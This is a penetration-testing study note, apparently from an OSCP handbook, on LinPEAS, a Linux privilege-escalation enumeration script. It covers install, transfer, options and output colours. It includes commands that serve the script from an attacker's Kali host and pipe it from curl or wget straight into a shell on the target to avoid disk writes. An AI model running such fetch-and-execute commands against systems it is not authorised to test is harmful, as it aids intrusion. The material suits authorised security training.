---
title: "LinPEAS"
slug: linpeas
category: notes
handbook: oscp
tags: ["privilege-escalation", "linux"]
draft: false
pubDatetime: 2026-07-18T17:48:53+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "LinPEAS enumerates a Linux host for privilege escalation vectors and highlights the most promising findings by likelihood."
---
LinPEAS enumerates a Linux host for privilege escalation vectors and highlights the most promising findings by likelihood. It is the automated first pass after a foothold, run alongside the manual checks in [Privilege Escalation](/collections/oscp/privilege-escalation-linux).

## Install

Download the latest release on Kali:

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
```

Kali may also ship it through the `peass-ng` package. Locate an installed copy with:

```bash
find / -name linpeas.sh 2>/dev/null
```

## Transfer to the Target

LinPEAS runs on the target, so it has to get there from Kali. Serve it over HTTP:

```bash
# On Kali, in the directory holding linpeas.sh
sudo python3 -m http.server 80
```

Fetch and run it on the target. Piping straight into a shell avoids writing to disk, which sidesteps a `noexec` mount or a directory without the execute bit:

```bash
curl http://KALI/linpeas.sh | sh
# or
wget -qO- http://KALI/linpeas.sh | sh
```

If it must be written to disk, use a directory that is writable and executable. `/dev/shm` is a good fallback when `/tmp` is mounted `noexec`:

```bash
cd /dev/shm
wget http://KALI/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

## Run

Save the output so it can be reviewed without rerunning:

```bash
./linpeas.sh | tee linpeas.txt
```

Useful options:

- `-a`: All checks. Slower and noisier, but more thorough. Worth it when the quick pass finds nothing.
- `-s`: Superfast and quieter, fewer checks.
- `-e`: Extra enumeration.
- `-P <password>`: Supply a known password so it can test `sudo -l` and password reuse.
- `-o <groups>`: Run only selected check groups.

## Read the Output

LinPEAS colours findings by how likely they are to lead to escalation:

- Red on yellow background: a 95%-likely privilege escalation vector. Start here.
- Red: interesting, check it.
- Yellow, green: informational.

The colours can be lost or garbled over a raw reverse shell. Piping to `tee` and reviewing the file on Kali keeps things readable:

```bash
# Preserve the colours when reading the saved file
less -R linpeas.txt
```

Confirm and reproduce anything LinPEAS flags before acting on it. A highlighted SUID binary or writable file is a lead, not a finished exploit. Feed the confirmed findings into the triage order in [Privilege Escalation](/collections/oscp/privilege-escalation-linux).
